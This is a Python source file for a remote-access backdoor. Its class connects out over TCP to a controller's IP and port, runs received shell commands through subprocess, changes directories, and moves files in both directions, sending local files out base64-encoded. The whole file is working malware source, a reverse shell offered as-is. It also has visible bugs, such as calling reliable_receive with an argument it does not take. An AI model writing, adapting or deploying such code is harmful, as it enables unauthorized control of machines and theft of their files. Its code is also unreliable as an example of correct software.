#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64

class Backdoor:

    def __init__(self, ip, port):
        super().__init__()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while(True):
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] changing the current directory to " + path 

    def execute_command(self, command):
        return subprocess.check_output(command)

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] download successful"

    def run(self):
        while(True):
            command = self.reliable_receive(1024)
            if(command[0] == 'exit'):
                self.connection.close()
                exit()
            elif(command[0] == 'upload'):
                command_recv = self.write_file(command[1], command[2])
            elif(command[0] == 'cd' and len(command) > 1):
                command_recv = self.change_working_directory(command[1])
            elif(command[0] == 'download'):
                command_recv = self.read_file(command[1])
            else:
                command_recv = self.execute_command(command).decode()
            self.reliable_send(command_recv)

    
